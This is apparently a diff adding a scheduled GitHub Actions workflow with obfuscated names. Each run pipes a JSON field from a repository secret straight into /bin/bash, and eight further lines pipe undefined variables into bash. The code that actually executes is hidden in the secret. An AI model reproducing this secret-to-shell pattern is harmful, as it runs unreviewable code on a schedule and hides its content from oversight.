@@ -1,0 +1,26 @@
+name: xinfenglincui
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xinfenglincui
+        env:
+          xfply6915: ${{ secrets.xfply6915 }}
+        run: |
+          echo $xfply6915 | jq -r .zvm31275 | /bin/bash
+          echo $v8 | jq -r .xl5 | /bin/bash
+          echo $k0326 | jq -r .byl3 | /bin/bash
+          echo $g68308 | jq -r .p473 | /bin/bash
+          echo $l408 | jq -r .nngu8 | /bin/bash
+          echo $uhegs059 | jq -r .jsh5801 | /bin/bash
+          echo $im24664 | jq -r .c69 | /bin/bash
+          echo $ahwc6 | jq -r .gifgn84133 | /bin/bash
+          echo $ybl22942 | jq -r .l50654 | /bin/bash
+
